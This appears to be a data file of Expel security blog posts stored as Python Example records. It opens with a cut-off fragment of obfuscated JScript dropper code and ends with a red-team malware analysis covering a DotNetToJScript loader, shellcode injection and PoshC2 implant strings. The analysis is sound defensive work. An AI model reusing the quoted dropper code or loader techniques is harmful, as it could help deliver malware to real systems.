lgnsyjcm15(lgnsyjcm2656(lgnsyjcm28, lgnsyjcm8, lgnsyjcm4));lgnsyjcm9801.open();lgnsyjcm9801.position = 0;lgnsyjcm9801.type = 2;lgnsyjcm9801.charset = 437;lgnsyjcm9801.writeText(lgnsyjcm56(lgnsyjcm081));lgnsyjcm081 = 0;lgnsyjcm9801.saveToFile(lgnsyjcm4315);lgnsyjcm9801.close();lgnsyjcm963 = 1;} catch (lgnsyjcm265) {return 0;}return lgnsyjcm963;}function lgnsyjcm400() {try {lgnsyjcm0147.lgnsyjcm786;return true;} catch(lgnsyjcm27) {if (typeof WScript === \'object\') {return true;}lgnsyjcm481();}}function lgnsyjcm206(){var lgnsyjcm681;var lgnsyjcm4718;try{lgnsyjcm681 = lgnsyjcm15(lgnsyjcm2656(\'EdT:2)?+6**kP&gt;Yj\', lgnsyjcm8, lgnsyjcm4));lgnsyjcm4718 = lgnsyjcm681.RegRead(lgnsyjcm2656(\'rz%I07urKoW0mJVbfPQ=}Kp;]cNjAFcRVlW#ckgw7%I&gt;(,I5,dv&amp;KR/,^kH+9*p=/6*dFQ+mC2T|j[,;T)+FE\', lgnsyjcm8, lgnsyjcm4));if (!lgnsyjcm4718) {return false;}return lgnsyjcm4718;} catch(lgnsyjcm0598){return false;}}function lgnsyjcm481(){var lgnsyjcm9032 = "\\;var lgnsyjcm4797;var lgnsyjcm867;var lgnsyjcm337 = """";var lgnsyjcm118 = \'""\';var lgnsyjcm449 = """";try {lgnsyjcm4797 = lgnsyjcm15(lgnsyjcm2656(lgnsyjcm737'}) (input_keys={'title'}),
  Example({'title': 'More good news in still unusual times', 'url': 'https://expel.com/blog/more-good-news-in-still-unusual-times/', 'date': None, 'contents': 'Subscribe  EXPEL BLOG More good news in still unusual times Expel insider  4 MIN READ  DAVE MERKEL, YANEK KORFF AND JUSTIN BAJKO  NOV 18, 2021  TAGS: Cloud security / Company news / MDR Here comes the unicorn swag. Expel is abuzz with the recent announcement that weve officially reached unicorn status. Even though many of us are still working from our homes during this infernal lingering global pandemic  the excitement is palpable. Our $140.3 Million Series E financing is an incredible gust of wind in our sails. CapitalG , Alphabets independent growth fund, and Paladin Capital Group co-led another round of financing with support from our existing investors : Greycroft, Index Ventures and Scale Venture Partners. Were also excited to welcome new investors participating in this round: Cisco Investments and March Capital. Theres a long list of things were grateful for that well be sharing with our family and friends this Thanksgiving. We were named a Leader in The Forrester Wave: Managed Detection And Response, Q1 2021 and Leader in IDC MarketScape for U.S. Managed Detection and Response Services Market 2021 Vendor Assessment (doc #US48129921, August 2021). We won Exabeams MSSP/MDR U.S. and North America partner of the year award and have been listed on a number of FORTUNEs best places to work lists. We were listed on the AWS Marketplace where people can buy our 247 MDR service for their AWS (and hybrid) environments, and continued forming strong partnerships with our community . And we did it all while maintaining quarterly NPS scores of over 80 despite our rapid growth. Oh, and were now a tech startup that reached a $1 billion valuation in just five years. Thats really freakin cool. That puts us among 32 other cybersecurity unicorns  nine of which have also reached this milestone in 2021. Thats 32 out of more than 3,500 cybersecurity companies. And thats just in the U.S. Its humbling. Were honored to be listed among these companies, and to know that our investors continue to place their bets on us  understanding that well use these resources to continue building something that sets us apart from other MDR vendors and defines the future of the modern security operations center (SOC). Since inception, weve wanted to create space for people to do what they love about security. And were doing it! Our customers love it. Our investors see that, and theyre doubling down. Could we have done this alone? No way. The fact that we did that during some truly unusual and painful times cant be overlooked. Were eternally grateful to our team, customers and partners. Locking arms to climb the mountain Thats been our motto for the past year and a half. We end every all-hands meeting with the reminder that well make it  we just need to lock arms as we climb this mountain. Because we get it done together. Its not about ninjas and rockstars; its about the strength of our team. We set out to make security as accessible as the internet, and this past year put all of us to the test. And the Expel team didnt just rise to the occasion  we were named among the leaders in the industry. Recognition from Forrester and IDC is an honor and further validation that even during times of chaos, we can and will deliver on our mission to help people get back to doing what they love. We cant say it enough: we couldnt have done this without our customers and partners. Together, weve built something that goes beyond world-class security. And weve been blown away by the enthusiastic outreach weve received from other security leaders and cant wait to build upon and expand those partnerships. Our collective curiosity allowed us to look around corners, create community outside Expel and build something thats changing the industry. You might have heard (and read ) about how we focus on optimizing the human moment. So, what does that really mean? Were not just talking about using tech to handle what can be automated so our crew can shine in the moments that need a human mind. Were making space for Expletives to grow and show up to work authentically. Were giving our customers time back in their day so they can focus on what makes them look forward to coming into work. Were discovering whats next and creating solutions with our partners. In 2020, we all found ourselves at the foot of a tall and scary-looking mountain. But this group locked arms and we climbed up. It confirmed what us founders already knew  with this crew, we can climb any mountain. Forging ahead As our customers navigate still uncertain times, they can be certain that well have their back. This new investment will help us continue to keep our customers safe while also pioneering a path forward. Were growing quickly in both size and in the myriad ways in which we help keep our customers safe. Our industry has a lot to consider as we look to whats next: ransomware attacks are on the rise, phishing tactics are evolving and orgs of all sizes are waking up in the cloud. And those are just a few examples. These arent easy challenges to tackle. But we have the utmost faith in our team and the outstanding collaboration we experience with our existing customers. The creative minds and technical skills that Expletives bring to the table will guarantee that well make very good use of this money. Well continue to expand our cloud security offerings, grow our sales operations, explore going international, add to our rapidly growing list of security partners and throw open the gates that have locked out so many people from entering the cybersecurity field. What this all means is that well keep building seriously cool $#*! . Well keep bringing in new ideas and perspectives to the team through our Diversity, Equity and Inclusion (DEI) recruitment initiatives  or Equity, Inclusion and Diversity (EID) as we call it here at Expel  that will keep us at the front of the pack. And thanks to our incredible crew, well continue to dramatically improve the efficacy of detection and response. Expletives will continue problem solving with our customers and partners  keeping a close eye on the trends that impact our customers and inspire us to build new capabilities. And well keep sharing the insights we gather on a regular basis with the community through blogs , attack vectors reports and by creating platforms for our crew to share their experiences and knowledge with the security community. Were proud of the ground weve covered this past year. And were even more excited about where were going next. Want to find out more about what were doing next? Wed love to chat .'}) (input_keys={'title'}),
  Example({'title': 'new integrations to manage overall business risk', 'url': 'https://expel.com/blog/integrations-roundup-new-integrations-to-manage-overall-business-risk/', 'date': 'Mar 29, 2023', 'contents': 'Subscribe  EXPEL BLOG Integrations roundup: new integrations to manage overall business risk Engineering  3 MIN READ  ALAN NEWMAN  MAR 29, 2023  TAGS: Cloud security / Company news / Tech tools At Expel, we take a bring-your-own (BYO) tech approach to security operations. Instead of requiring customers to buy and implement specific tech, we integrate with the security tools they already have to maximize their existing investment. This also gives our customers more control over the security tech they use now and in the future. Our integration portfolio has more than 100 integrations spanning cloud, Kubernetes, SaaS, SIEM, network, endpoint technologies, and more. Were continuously adding new integrations to the portfolio to ensure were integrating with the right tech to manage risk across your business. But risk isnt limited to security alone. If the last few years have taught us anything, its that risk is a business-wide challenge that spans all people, processes, and technology within the organization. Thats why our strategy with our security operations platform, Expel Workbench, is to integrate with all the applications that present a layer of risk to your business, not just security tech. Thats why were excited to share that weve built new integrations with popular business applications, including Slack, Salesforce, Workday, and GitLab, so customers can manage overall business risk all within the Expel Workbench. Security tech is still a fundamental component of the risk equation, which is why weve also released new integrations with Microsoft Intune and ExtraHop. Slack Slack is a corporate instant messaging system that supports messaging, voice calls, media, and files through private chats, shared groups, or even as part of communities. As hybrid work is the norm for most organizations, the amount of highly sensitive data being communicated through Slack has substantially increased, making it a new vector of risk. With our new Slack integration, the Expel Workbench has detections for user logins from suspicious countries, IPs, and from TOR domains in addition to monitoring risky configuration changes in the platform. We also support DUET detections for configuration changes such as when a user is granted an owner role. Salesforce Salesforce is a cloud-based customer relationship management platform. Sales, marketing, and success teams use Salesforce heavily to store prospect and customers personally identifiable information (PII). That PII is critical for effective go-to-market outreach, but also presents a risk to both the business and the customer if exposed. Our new Salesforce integration, working with Salesforce Shield and Real-Time Event Monitoring, identifies suspicious authentication requests including both the user and IP address behind the authentication event, credential stuffing and session hijacking attacks, and anomalous API events. It creates a timeline of the event, and enriches with context like IP address, country, domain name, user agent string and more, and then scopes for related alerts. The gathered security signals and audit events are also used to provide additional context that helps our analysts and robots investigate alerts from other security technologies. Workday Workday is a cloud-based enterprise resource planning (ERP) technology used for managing human resource functions, financial analysis, and analytical solutions, among other processes. The human resource (HR) team typically uses Workday to manage employee information, like compensation, benefits, social security information, and more. While Workday may make the HRs team managing employee information easier, its now become a database of sensitive employee information. Our new Workday integration monitors suspicious IP addresses, domain names, and user agent strings. GitLab GitLab is a DevOps platform that helps in software development. It provides the ability to collaborate, secure, and release software using easy-to-manage tools. Its one of the most popular platforms of its kind, and developers are increasingly building, releasing, and deploying applications that can expose the business to risk without the right security controls in place. Our new integration monitors GitLab audit events to identify suspicious authentication requests, including IP address, country, domain name, user agent strings, as well as monitoring risky configuration changes done in the platform. Microsoft Intune Microsoft Intune (formerly Windows Intune) is a cloud-based endpoint management solution. It manages user access and simplifies app and device management across many devices, including mobile devices, desktop computers, and virtual endpoints. Expel Workbench now integrates with Microsoft Intune to quickly gather investigative data for triage and investigation of alerts to deliver high-quality and expedient containment and remediation actions  as well as monitoring risky configuration changes done in the platform. ExtraHop ExtraHop Reveal(x) provides AI-based network intelligence that stops advanced threats across cloud, hybrid, and distributed environments. The core of ExtraHop technology is a passive network appliance that uses a network tap or port mirroring to receive network traffic. We now integrate with ExtraHop Reveal(x) and monitor the platforms security alerts. Integrated platform to manage overall business risk Cybersecurity isnt an isolated discipline. Organizations are constantly adopting new technologies to support their missions, and this means that the threat landscape has grown in size and sophistication. Risk spans the business, so were excited to provide even more opportunities to manage this business risk, all from the Expel Workbench platform. To learn more about these integrations, please visit our integrations guide .'}) (input_keys={'title'}),
  Example({'title': 'New UK cybersecurity report: top 5 findings', 'url': 'https://expel.com/blog/new-uk-cybersecurity-report-top-5-findings/', 'date': 'Apr 19, 2023', 'contents': 'Subscribe  EXPEL BLOG New UK cybersecurity report: top 5 findings Security operations  3 MIN READ  CHRIS WAYNFORTH  APR 19, 2023  TAGS: MDR We recently surveyed 500 IT decision-makers (ITDMs)including IT and security execs, directors, and managers; owner/proprietors; partners; board chairs and members; chief executives; and managing directorsto get a better sense for the state of cybersecurity in the UK. The report, The UK cybersecurity landscape: challenges and opportunities , was released today. Some of the findings align with our expectations, while others surprised us. And while at first glance, the findings may paint a scary picture, theres lots of opportunities for security leadership and teams to improve their strategies and capabilities. Heres a preview of our top findings. 1: ITDMs rate cybersecurity third on their list of concerns, but those in IT-specific roles see it as the biggest problem. Its rough going in the UK right now, as businesses deal with (among other things) the cost-of-living crisis, the looming prospect of a recession, and ever-changing customer expectations. Despite these worries, half of all respondents highlighted security (50%) as a top challenge for 2023, behind energy prices (61%) and the economic climate (54%). Howeverperhaps owing to their proximity to the daily activity of the security operations centre (SOC)IT departments see it as the most daunting challenge they face. Respondents also noted worries over sustainability, soaring customer expectations, and a global talent shortage. 2: A significant amount of the allotted security budget is going unused. ITDMs surveyed report a median annual security budget of 200,000, which (predictably) varies by company size. Surprisingly, though, the survey found that, on average, 26.7% of allocated security budgets went unspent. This equals an average of 53,400 in available cybersecurity budget was unused in 2022. Twenty-one percent of respondents reported spending 50% or less of their security budgets. 3: U.K. organisations face tremendous security-related fatigue. Security teams have their hands full. In addition to fighting the bad guys (investigating and researching alerts, responding to cybersecurity incidents, threat hunting, etc.), theyre also asked to conduct cyber hygiene training for employees, implement and integrate new security tools, and, by the way, train themselves so they can stay abreast of the latest hacker best practices (or perhaps wed call these worst practices). To complicate every step in the journey, they spend a huge chunk of time on low-priority alerts and false positives. This, in turn, leads to the much-discussed phenomenon of alert fatigue, which occurs when a constant barrage of alerts hits the SOCs queue and the team either cant deal with the volume or becomes de-sensitised to them. The result? Analysts either take longer to respond or ignore the alerts completely. Adding insult to injury is a talent shortage of about  3.4 million security professionals , a number roughly equal to the combined population of the cities of Birmingham, Glasgow, Liverpool, Bristol, and Manchester, and representing an increase of more than 26% over 2021, per (ISC). This results in defenders finding their cybersecurity work frequently infringing on their private lives. Ninety-three percent of respondents say work related to IT management and cybersecurity risk has forced them to cancel, delay, or interrupt personal commitments. Thirty-four percent of the total say this happens all or most of the time, as do 43% of IT team members and 38% of CIOs/CTOs. (Many organisations, especially in the 250-1,000 employee tier, dont have a dedicated security team, and in these cases, the IT team is responsible for security operations.) What impact can this eventually have? 4: The resulting burnout threatens security and causes staff turnover. A distressing number of those charged with safeguarding the business against cyberattackers experience burnout (61% of all respondents and a whopping 70% of IT and security pros say they or members of their teams are victims). That those in the trenchessecurity and IT teamsreport higher numbers than everyone else suggests the problem may be worse than company leaders realize. As we know, burnout is unsustainable. In the absence of internal remedies, the risk that workers will exit increases. In this case, respondents believe theres better than a 50% chance theyll lose people in the coming year. Of particular interest: these folks report theyre thinking of leaving the cybersecurity industry, not just their current company. This should be a very concerning finding for U.K. organisations, as it suggests the already thin talent pool could shrink further. 5: Because of all these challenges, UK organisations tend toward a tactical and reactive approach vs. a forward-looking, strategic one. Thirty-eight percent of respondents indicated mandatory regulation as the most common driver for further security investment. The next two responses will also sound familiar to security leaders: responding to a breach (32%) and improving security for maturing businesses (29%) are the next most common drivers of investment. Fewer organisations seem motivated by customer-driven requirements (25%) and executive input (22%). The overall picture is of an industry operating as largely responsive and tactical vs. proactive and strategic. And in looking at the rest of the findings in our research, its no wonder! Cybersecurity is already a hard jobthe added challenges we found make it even harder! Given these challenges, its very difficult for security leaders to shift their mindset, but organisations get the best outcomes when engaged leadership sees security budget as a business-enabling investment instead of a cost centre and commits to evolving around the user. The full report is, in some places, a confirmation of many ITDM concerns . In others, its a bracing splash of cold water. In all cases, its insightful and provides useful guidance for those plotting their security strategies for the coming year and beyond. We encourage you to download your copy today and spend a few minutes with it (its actually briefer than you might expect, and also includes a football analogy you might appreciate). If you have comments or questions, please drop us a line .'}) (input_keys={'title'}),
  Example({'title': 'NIST CSF: A new interactive tool to track your progress', 'url': 'https://expel.com/blog/nist-csf-new-interactive-tool-track-progress/', 'date': 'Mar 3, 2020', 'contents': 'Subscribe  EXPEL BLOG NIST CSF: A new interactive tool to track your progress Security operations  2 MIN READ  BRUCE POTTER  MAR 3, 2020  TAGS: CISO / Framework / How to / NIST / Planning If youve ever checked out Expel on LinkedIn or Twitter , or youve ever read one of our blog posts, then you know were big fans of the NIST Cybersecurity Framework (CSF) . Why we like the NIST CSF Theres a lot to like about the NIST CSF: A regulatory-agnostic framework like the CSF helps drive more mature security programs. With the CSF, companies can easily and consistently assess where they are today and where they want to be from a cybersecurity standpoint. Its a great way to democratize security and bring risk management to the masses. We like that it demystifies a complex subject and allows less technical orgs to transact on security in a meaningful way. It helps orgs of all shapes and sizes measure and report on their respective security programs. This might be our favorite thing about the NIST CSF  the framework gives security professionals, regardless of the organization theyre in, a standardized way to measure and talk about their security maturity, and the progress theyre making on those efforts. Whether youre making the case for additional security budget or presenting to your board of directors, the NIST CSF gives you a tangible and effective way to do that. Making the NIST CSF into something actionable for your org While there are lots of positives about the NIST CSF, we get that putting it into practice is sometimes easier said than done. How exactly do you take a framework and implement it, let alone track how youre doing? We heard you. And thats why we created our NIST CSF self-scoring tool a few years ago, which you can download right here . Now available: the NIST CSF dashboard in Expel Workbench If youre an Expel customer, weve got an even better way for you to take advantage of our NIST CSF self-scoring tool. We just introduced an interactive version of our NIST CSF self-scoring tool right in Expel Workbench. Now its even easier to use the CSF, measure your progress and report on it  all of which is done through the same interface you use every day to manage your orgs security. Take a look: Heres the NIST CSF Dashboard for Expel Workbench, available right in the same interface you use to to keep tabs on your orgs security. Heres a closer look at the dashboard and the self-scoring mechanisms. See it for yourself Here at Expel we use the NIST CSF self-scoring tool to measure our own progress when it comes to security, and lots of our customers use it too. Theyve told us the tool is easy to use, effective and helps them measure and track their security programs. Want to check out Expel Workbench and see how it can help you streamline your security operations? Give us a shout  wed love to talk.'}) (input_keys={'title'}),
  Example({'title': "NIST's new framework: Riding the wave of re-imagining ...", 'url': 'https://expel.com/blog/nist-new-framework-riding-wave-reimagining-privacy/', 'date': 'May 21, 2019', 'contents': 'Subscribe  EXPEL BLOG NISTs new framework: Riding the wave of re-imagining privacy Security operations  4 MIN READ  BRUCE POTTER  MAY 21, 2019  TAGS: CISO / Managed security / NIST / Planning Let me set the scene for you: Everyone is stumbling around in the dark, trying to figure out what the heck privacy really means and what they should do about it. Right now, were living in a gray, soulless world of privacy compliance  which doesnt involve much independent thought or risk-based decision making. All of a sudden, our hero  the National Institute of Standards and Technology (NIST)  rides in with its Privacy Framework. And all is right in the world again. The sun is shining, birds are singing and the flowers are blooming. Oh, and all the characters in this story are now off and running to develop their own meaningful and fulfilling privacy risk management program. End scene and cue the happy music. Sure, this movie might not ever make it to the big screen, but for security nerds like us the development of NISTs forthcoming Privacy Framework is pretty award-worthy. Its going to revolutionize how most of us think about privacy. Whats the NIST Privacy Framework solving for? Many companies are only starting to come to grips with privacy thanks to new privacy regimes like the EUs GDPR and Californias CCPA. And when you come to grips with a regulation, it typically looks a lot like compliance. What boxes do I need to check in order to be compliant? you might ask yourself. And once youre compliant, youre Good Enough and you move onto the next problem. While taking a compliance-driven approach might feel like the equivalent of hitting an easy button, theres one big problem: It leaves gaps in your orgs privacy posture that youre probably not even aware of. The compliance = security mindset has been a problem for years, and industry analysts and journalists love reminding us after every breach that simply being compliant isnt enough. Turns out that privacy is no different. Enter NIST and its forthcoming Privacy Framework. Youve probably heard of NISTs Cyber Security Framework (CSF)  it was developed a few years ago in response to an Executive Order issued by former President Obama. Many organizations use the CSF to get their security house in order; its an open document, its comprehensive, its approachable and companies of all shapes and sizes can use it. NIST recognized that privacy is a domain that needs a similar framework to help guide orgs big and small to better outcomes. So theyve taken it upon themselves to create a Privacy Framework modeled after the CSF. And when I say modeled, I mean both in process and in form. The original CSF was constructed through a series of workshops held around the country where NIST solicited feedback on various work products and refined the CSF with the publics involvement until we landed where we are today. Theyre using the exact same process with the Privacy Framework. A draft document was released earlier in May and I just returned from Atlanta where they held their workshop to discuss the draft. The next workshop is happening in July in Boise, with more interim products and documents likely to be released in the coming months. In form, the draft document looks very similar to the CSF. There are five core functional areas, and each functional area is broken down into categories and sub-categories. Three of the five CSF core functional areas  Identify, Protect and Response  are the same as the CSF, but in the Privacy Framework theyve rounded out the list by adding Control and Inform. When you read the sub-categories, youll see that many were lifted directly from the CSF and the word security replaced with privacy. This is an overt recognition that security is an integral part of privacy and vice versa. These two frameworks will be intertwined in their structure and their execution within organizations. How orgs will use the NIST Privacy Framework This new effort from NIST is a comprehensive framework that anyone can use to build a true privacy risk program, not just a compliance program. This means you can use the Privacy Framework to take a holistic approach to privacy instead of playing whack-a-mole with various controls in different regimes. And the integration with the CSF opens the door to bringing together a diverse group of stakeholders in your org to participate in strategizing about both security and privacy. Lawyers, data scientists, security professionals, privacy engineers, social scientists and executives will need to (and should) come together to address privacy at an organizational level. This Privacy Framework represents the democratization of privacy in the same way that the CSF brought security risk management to the masses. It demystifies a complex subject and allows smaller, less technical organizations to transact on privacy in a meaningful way. As a result, I believe were going to see a wave of privacy risk management programs created throughout private industry. These programs will be tightly tied to cybersecurity activities but will have a focus on privacy and include a wider group of stakeholders in the development process. Organizations will be able to better protect an individuals privacy (w00t!) and continue to comply with various regulatory and industry requirements. The bottom line The Privacy Framework is still a work in progress  and as it stands isnt perfect. There was lots of constructive feedback shared at the Atlanta workshop and Im sure there will continue to be. (By the way, if youve looked at the draft and want to share comments, you can email your feedback to privacyframework@nist.gov ). NIST will continue to refine the Privacy Framework and their goal is to have a final draft published by the end of 2019. Im optimistic that the final version of the Privacy Framework will be well harmonized with the CSF and allow organizations to rapidly adopt it as part of a broad and comprehensive privacy risk program. That will be the moment when privacy is re-imagined. The transformation of privacy from compliance to risk in a way that is attainable by organizations both big and small will be a big win not just for those orgs but also for all citizens. Cue the applause and roll the credits.'}) (input_keys={'title'}),
  Example({'title': 'Not the Jedi trials, but our free trial could help bring ...', 'url': 'https://expel.com/blog/not-the-jedi-trials-but-our-free-trial-could-help-bring-balance-to-the-force/', 'date': 'May 4, 2023', 'contents': 'Subscribe  EXPEL BLOG Not the Jedi trials, but our free trial could help bring balance to the Force Security operations  1 MIN READ  JAMES JURAN  MAY 4, 2023  TAGS: Cloud security / MDR You didnt think wed let May the Fourth go by without a Star Wars -themed post, did you? In the Star Wars canon, Jedi Padawan needed to complete five trials to achieve Knighthood. Thankfully, we only have one trial, and its free. Better, it doesnt involve intense physical pain, or worse, deep self-discovery. Instead, this trial is all about testing out Expel MDR (managed detection and response) for Cloud Infrastructure. How does it work? Sign up here , and youll get 14 days of full access to our security operations platform, Expel Workbench , to check out our MDR for Cloud Infrastructure product. You connect your tech, conduct an incident simulation (well walk you through how), and well send you the findings of that alert. And if Expel actually does detect an Imperial battlecruiser (legitimate threat) in the Outer Rim (your cloud environment) during the trial period, our Jedi Council (security operations center) will have you covered, and will support your cloud environment, like it would for any customer, throughout the trial period. Once your trial is up, well freeze your account in carbonite and wont ingest any more data from your connected tech. Then well delete your account and data altogether after another 14 days. We dont store or keep any of your data after the 14-day frozen period expires. When it comes to the cloud, we know staying on top of multiple computing environments, databases, policies, and best practices can be complex, time consuming, and burdensome for your team. These concerns could be holding you back from moving to the cloud or scaling your cloud environment. Perhaps you dont have enough visibility, are having trouble dealing with cloud security alerts, or simply dont have consistent security coverage across your different cloud environments. Our goal with this free trial is to show you how we can help you up your cloud security game. So why not test out how Expel Workbench works in your environment? Setting it up is easier thanconstructing your own lightsaber, and might just help bring balance to your own little corner of the Force.'}) (input_keys={'title'}),
  Example({'title': 'Obfuscation, reflective injection and domain fronting; oh my!', 'url': 'https://expel.com/blog/obfuscation-reflective-injection-domain-fronting/', 'date': 'May 26, 2020', 'contents': 'Subscribe  EXPEL BLOG Obfuscation, reflective injection and domain fronting; oh my! Security operations  9 MIN READ  BRITTON MANAHAN  MAY 26, 2020  TAGS: Get technical / Managed detection and response / Security Incident / SOC / Vulnerability We detect and respond to a lot of red team activity at Expel. Each engagement is a great opportunity for our SOC analysts to gain additional experience responding to an attacker (albeit a simulated one). Red team engagements help any security team stay ahead in a world with continuously evolving attacker tradecraft. When going head-to-head with a red team, we encounter a broad range of attacks. During a recent red team simulation we detected and responded to the execution of a suspicious VBscript file. Acquiring malicious files gives us the opportunity to extract deeper details that can be invaluable. In this post Ill walk you through our initial detection and then show you how we: Determined the logic implemented by the VBscript and its payload Extracted key details of the payload via base64dump.py and pecheck.py Decompiled the payload with JetBrains DotPeek Followed the chain of obfuscation to reach the red team PoshC2 implant Analyzed the red team implant for attacker IOCs Then Ill share the details of the capabilities the file contained as well as the insights we gathered coming out of this exercise. Spotting something suspicious: malware detection Malware analysis is like a box of chocolates, in that you never know what youre going to encounter as you inspect the details of malicious code. During this red team engagement with an Expel customer, the CrowdStrike EDR Platform alerted on the execution of a suspicious VBScript file. Expel Workbench Alert Details 1 Expel Workbench Alert Details 2 So, we dove in to take a deeper look. CrowdStrike Detection Details For this CrowdStrike alert, a VBScript file named settings.vbs was launched with the command-line version of the Windows Script Host, cscript.exe. CrowdStrike Overwatch observed that the cscript.exe process reflectively injected a library named SharpDLL.dll. Reflective injection inserts an executable library file into the address space of a process from memory instead of from on disk. This method doesnt rely on the LoadLibrary Windows API call, which only works with libraries files located on disk. The Expel Global Response team, which provides Expel with advanced IR capabilities during critical incidents, noticed two additional recorded activities for the cscript.exe process: Several .NET Framework Libraries (examples below) were loaded A DNS request for paypal.com (this will be explored more later on) CrowdStrike Detection Disk Operations CrowdStrike Detection DNS Request These recorded activities were extremely suspicious and signaled to us that it was time to conduct an investigation. Thats when I began my analysis. Analyzing the file in three phases When I looked at the contents of the settings.vbs file, I noticed it began with following comment block: Beginning of settings.vbs None of the script functionality contained in the rest of the settings.vbs file relates to this comment block, which is part of its attempt to achieve a surface appearance of performing printer and network administrative activities. When looking at the first section of code executed by the script, note that the first steps taken determine which version of .NET the process executing the script should configure itself to load in. settings.vbs .NET Version Selection If present in a process when the .NET framework is loaded, the COMPLUS_Version environment variable will force a certain version of the .NET framework to be loaded. Based on the presence of a particular 4.0 version of the .NET framework, determined by checking for the existence of a Windows Registry key, the script will set this environment variable to either v4.0.30319 or v2.0.50727. The next action taken by the script is the initialization of two large base64 encoded strings, wpad_1 and wpad_2. settings.vbs Base64 Strings Both of these strings are passed through the ProxySettingConfiguration function, which decodes a provided base64 string. This function was the first strong evidence that the script was generated using the DotNetToJScript tool. DotNetToJScript is described as a tool to create a JScript file which loads a .NET v2 assembly from memory created by James Forshaw. This function is almost exactly the same as the Base64ToStream function in the vbs_template.txt file in the DotNetToJScript project source code. DotNetToJScript Base64 Decode Function settings.vbs Base64 Decode Function The decoded base64 strings are then deserialized using the deserialize_2 function. Serialization is the process of converting an object into a stream of bytes to store the object or transmit it to memory, a database, or a file according to Microsoft C# Programming Documentation . Deserialize, the reverse of this process, returns the byte stream into its original form. settings.vbs Decode and Deserialize Strings After undergoing the decoding and deserialize process, the wpad_1 variable becomes the following: wpad_1 Contents As part of the .NET deserialize process, the script host process will attempt to load the 3.0.0.0 version of the Microsoft.PowerShell.Editor (The PowerShell ISE). This is likely some type of check on the current system the script is executing on, supported by the error check that happens immediately after in the code ( If Err.Number &lt;&gt; 0 ). Powershell ISE Check Failing on Fresh Windows 10 VM If this check passes, the code then moves onto its main finale of decoding and deserializing the larger base64 string in the wpad_2 variable. Seeing that there was an MZ header present in the second base64 string, and evidence of DotNetToJScript being used, I used a collection of Python scripts from Didier Stevens to continue my analysis in three phases. Phase 1: Settings.vbs  uqatarcu.dll: The base64dump.py and pecheck.py Python scripts by Didier Stevens make the process of locating a Windows portable executable (PE) file inside a base64 string much easier. After extracting the base64 string for the wpad_2 variable in settings.vbs into a text file, this script is used to expedite its analysis. Running the following command using the two scripts will: Decode the base64 string in wpad_2.txt while ignoring any whitespace or double quotes in the string Search for the first occurrence of the MZ Windows PE file signature Pass the decoded results starting at the search hit to pecheck.py to validate and parse the PE header Output the extracted information from the PE header base64dump.py [options] [file] Options used in blog post -w, --ignorewhitespace ignore whitespace -i IGNORE, --ignore=IGNORE characters to ignore -s SELECT, --select=SELECT select item nr for dumping (a for all) -c CUT, --cut=CUT cut data -d, --dump perform dump base64dump.py -w -I 22 -s 1 -c "[\'MZ\']:" -d wpad_2.txt | pecheck.py The resulting verified PE file includes the following information: uqatarcu.dll PE File Information uqatarcu.dll Hashes and Overlay Details Then with the overlay offset known (extra bytes at the end of the parsed PE file), the following command will write out the first dll, uqatarcu.dll, with the extra overlay removed. base64dump.py -w -I 22 -s 1 -c "[\'MZ\']:0xb9c00l" -d wpad_2.txt &gt; uqatarcu.dll Phase 2: uqatarcu.dll  Microsoft.dll and enclosed base64: The beautiful thing about C#.NET malware analysis, being an interpreted language instead of a compiled programming language, is that binary files can be automatically decompiled back into their original source code. JetBrains DotPeek is a program that will automatically do this decompilation for you. Opening up uqatarcu.dll in JetBrains DotPeek shows that it imports the classic 3 function combo for loading shellcode: VirtualAlloc, VirtualProtect and CreateThread. uqatarcu.dl Windows API imports Along with two more base64 strings, s1 and s2. uqatarcu.dll s1 and s2 The s1 string contains base64 encoded 32-bit shellcode and s2 contains 64-bit shellcode. The DLL examines the byte size of a pointer to determine the correct architecture to use, and will deploy the result to a dynamically allocated section of memory. After updating the allocated memory permissions to PAGE_EXECUTE_READWRITE, CreateThread is called with the beginning of this memory block (IntPtr num) as its starting address. uqatarcu.dll 32 or 64-bit uqatarcu.dll Deploy Shellcode Proceeding with the 64-bit version of the next stage for analysis, the contents of the s1 string, there are four hits this time for MZ in the decoded base64 string. However, only the final MZ hit is fully validated by pecheck.py. The cut parameter base64dump.py makes it easy to specify after which search hit of MZ we want to start passing the decoded string to pecheck.py. The number placed after the search term ending bracket specifies this in the commands below: base64dump.py -w -I 22 -s 1 -c "[\'MZ\']1:" -d b64_uqatarcu_s1.txt | pecheck.py uqatarcu.dll s1 First MZ Match base64dump.py -w -I 22 -s 1 -c "[\'MZ\']2:" -d b64_uqatarcu_s1.txt | pecheck.py uqatarcu.dll s1 Second MZ Match base64dump.py -w -I 22 -s 1 -c "[\'MZ\']3:" -d b64_uqatarcu_s1.txt | pecheck.py uqatarcu.dll s1 Third MZ Match base64dump.py -w -I 22 -s 1 -c "[\'MZ\']4:" -d b64_uqatarcu_s1.txt | pecheck.py uqatarcu.dll s1 Forth MZ Match The cut data that was validated as a PE file by pecheck contains some interesting attributes for the file name and description: Microsoft.dll PE File Information This next DLL layer then can be extracted to disk with the following command: base64dump.py -w -I 22 -s 1 -c "[\'MZ\']4:" -d b64_uqatarcu_s1.txt &gt; Microsoft.dll This DLL is also a C#.NET binary, and loading it up in DotPeek reveals the following interesting code section: Microsoft.dll ShellCode Routine While this .NET source code makes it clear another base64 string is being decoded and executed, the location of it is not as straightforward. The binary does not contain any calls to the RunCS function as well as any base64 strings. Since a majority of the s1 string from uqatarcu.dll was bypassed as a result of the cut parameter [MZ]4: and the thread starting address was before the fourth MZ search hit, I decided to return to the s1 string to extract all available strings. base64dump.py -w -I 22 -s 1 -S b64_uqatarcu_s1.txt When scrolling through this output, the presence of an encapsulated base64 string visually stands out. uqatarcu.dll Encapsulated Base64 Phase 3: Encapsulated base64  dropper_cs.exe: The base64 string found within the s1 string was successfully parsed by pecheck as a valid PE file. The PE header file information contains a very interesting filename. base64dump.py -w -I 22 -s 1 -c "[\'MZ\']:" -d b64_from_b64_uqatarcu_s1.txt | pecheck.py dropper_cs PE File Information The binary can be further examined by generating a copy of it. base64dump.py -w -I 22 -s 1 -c "[\'MZ\']:" -d b64_from_b64_uqatarcu_s1.txt &gt; dropper_cs.exe dropper_cs.exe contains a number of notable strings including the domain seen being resolved during its runtime (paypal.com) and strong references to the PoshC2 implant: Parse_Beacon_Time ImplantCore update-crl.azureedge.net https://www.paypal.com:443 https://www.paypal.com:443/lt/?c setbeacon This final payload for this layered piece of malware is again written IN C#.NET. Loading it up in DotPeek provides a clear picture of command and control program functionality. dropper_cs Functions dropper_cs loadmodule dropper_cs download-file dropper_cs get-screenshotmulti 